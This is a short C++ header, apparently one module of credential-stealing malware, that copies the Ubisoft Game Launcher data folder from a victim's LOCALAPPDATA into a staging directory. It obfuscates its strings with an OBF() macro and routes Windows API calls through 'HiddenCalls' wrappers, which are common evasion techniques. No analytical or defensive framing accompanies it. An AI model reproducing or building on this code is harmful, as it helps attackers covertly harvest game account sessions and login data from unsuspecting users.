#ifndef UBISOFT_HPP
#define UBISOFT_HPP

#include <string>
#include <filesystem>
#include "Winapi_structs.hpp"

namespace fs = std::filesystem;

namespace Ubisoft {
    inline void Extract(const std::string& baseDir) {
        std::string ubisoftFolder = std::string(getenv(OBF("LOCALAPPDATA"))) + "\\" + OBF("Ubisoft Game Launcher");
        if (!fs::exists(ubisoftFolder)) return;

        std::string targetDir = baseDir + "\\" + OBF("Ubisoft");
        HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

        HiddenCalls::CopyDirectory(ubisoftFolder.c_str(), targetDir.c_str());
    }
}

#endif
